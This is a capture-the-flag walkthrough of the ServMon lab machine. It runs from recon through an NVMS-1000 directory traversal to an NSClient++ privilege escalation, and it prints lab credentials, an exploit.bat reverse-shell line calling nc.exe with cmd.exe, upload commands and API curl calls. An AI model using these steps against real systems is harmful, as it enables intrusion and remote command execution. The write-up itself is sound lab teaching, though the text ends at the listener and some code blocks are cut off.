# Overview
This is an interesting box as it has gotten a lot of heat - mostly due to the steps required for root - and I can see why: The web interface might be slowish and buggy under load but also people can mess with each other - pushing the frustration. As this includes overwriting others' files I think this box teaches what I call *gentleman behaviour*. Try to not mess with other peoples stuff when working on the same box.

# Recon
A quick `nmap` scan reveals
```bash
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5666/tcp open  nrpe
6699/tcp open  napster
8443/tcp open  https-alt
```
Logging into ftp anonymously we find two users `Nadine` and `Nathan` inside the `Users` folder. From Nadine's folder we get a `Confidential.txt` and a `Notes to do.txt` from Nathan:
```bash
$ cat Confidential.txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```
```bash
$ cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```
Not much to continue from. So we are done with ftp, since we have no creds for ssh we go over to the web page and see `NVMS-1000` running and a login prompt. Trying standard passwords does not work but
{: .text-justify}
```bash
$ searchsploit nvms

NVMS 1000 - Directory Traversal                        | exploits/hardware/webapps/47774.txt

$ cat /usr/share/exploitdb/exploits/hardware/webapps/47774.txt
# Title: NVMS-1000 - Directory Traversal
# Date: 2019-12-12
```
reveals a relatively new `Directory Traversal` vulnerability and combining with the info from the note, we know that there's a `Passwords.txt` file in Nathans Desktop, likely to be `C:\Users\Nathan\Desktop\Passwords.txt` - that looks promising. So we run `sudo msfconsole` and search the exploit:

```bash
msf5 > search nvms

Matching Modules
================

   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
```
We need to set RHOSTS which is the IP of the box 10.10.10.184 and we also notice the FILEPATH `/windows/win.ini` which is the short form for `C:/windows/win.ini` therefore we 
{: .text-justify}
```bash
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set RHOSTS 10.10.10.184
RHOSTS => 10.10.10.184
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set FILEPATH /Users/Nathan/Desktop/Passwords.txt
FILEPATH => /Users/Nathan/Desktop/Passwords.txt
```
and run the exploit
```bash
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > run

```
We see the exploit has created a text file and looking into it we find creds:
```bash
$cat /root/.msf4/loot/20200417043745_default_10.10.10.184_nvms.traversal_115301.txt

Trying these a little bit we find that `L1k3B1gBut7s@W0rk` works for Nadine via ssh:
```bash
$ ssh nadine@10.10.10.184

```
and we have completed user.
# Root part
For the root part we look into the NSClient mentioned in Nathans notes in `C:\Program Files\NSClient++`.
Looking into `nsclient.ini` we see plaintext creds and allowed hosts:
```bash
; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
```
So we can connect to the service from localhost only, therefore we need a ssh tunnel:
```bash
ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
```
and entering `http://localhost:8443` the NSClient++ asks for a password but the password from nsclient.ini will do the job.
This is where the heated discussion began:
Searching for a common exploit through metasploit revealed:
{: .text-justify}
```bash
$ searchsploit nsclient
------------------------------------------------------- ----------------------------------------
 Exploit Title                                         |  Path
                                                       | (/usr/share/exploitdb/)
------------------------------------------------------- ----------------------------------------
NSClient++ 0.5.2.35 - Privilege Escalation             | exploits/windows/local/46802.txt
```
and checking the NSClient++ page we see that this is the latest version available. In the text file are seven steps outlined to compromise the system. It turns out that only a few of the steps need to be done and especially the last command will crash the NSClient for all users on the box. Furthermore the steps require to upload a script called `evil.bat` which simply calls netcat and establishes a connection to our attacking machine. Since the script has to contain the IP of each user it has the risk of being overwritten. Obviously crashing the server is not the intended way and one has to be careful not to overwrite others scripts.
{: .text-justify}
The *intended* way to load the script is through the API:
1. Write the following lines into `exploit.bat`:
```bash
@echo off
C:\Temp\nc.exe your_ip port -e cmd.exe
```
2. Upload nc.exe and your `exploit.bat` to C:\Temp via scp: `scp nc.exe nadine@10.10.10.184:"C:\Temp"` and `scp exploit.bat nadine@10.10.10.184:"C:\Temp"`.
3. Run `nc -lnvp port` with the port specified in the script.
4. Create an external script in the NSClient++ via "Settings" -> "external Scripts" -> "scripts" -> green box "add a simple script": `Alias: exploit; Script C:\Temp\exploit.bat`. Save and optionally check the nsclient.ini if your entry appears.
5. Access the api:

```bash
nadine@SERVMON C:\Program Files\NSClient++>curl -k -i -u admin https://localhost:8443/api/v1/mod
ules
nter host password for user 'admin':
HTTP/1.1 200
Content-Length: 2299
Set-cookie: token=yapnxrpMCARCr4zdGc81tBDKsMlaZTXC; path=/
Set-cookie: uid=admin; path=/

[{"description":"Module used to execute external scripts","id":"CheckExternalScripts","load_url"
:"https://localhost:8443/api/v1/modules/CheckExternalScripts/commands/load","loaded":true,"metad
ata":{"alias":"","plugin_id":"0"},"module_url":"https://localhost:8443/api/v1/modules/CheckExter
nalScripts/","name":"CheckExternalScripts","title":"CheckExternalScripts","unload_url":"https://
localhost:8443/api/v1/modules/CheckExternalScripts/commands/unload"}
```
It shows us that we can load and unload external scripts via the specified `_url`.
Doing `curl -k -i -u admin https://localhost:8443/api/v1/mod
ules/CheckExternalScripts/commands/unload` should result in  a `Success unload CheckExternalScripts` and `curl -k -i -u admin https://localhost:8443/api/v1/mod
ules/CheckExternalScripts/commands/load` in a `Success load CheckExternalScripts`respectively.

If we now enter `exploit` in the Console of the web interface we receive our reverse shell as Administrator:
```bash
$ sudo nc -lnvp 443
[sudo] password for kali:
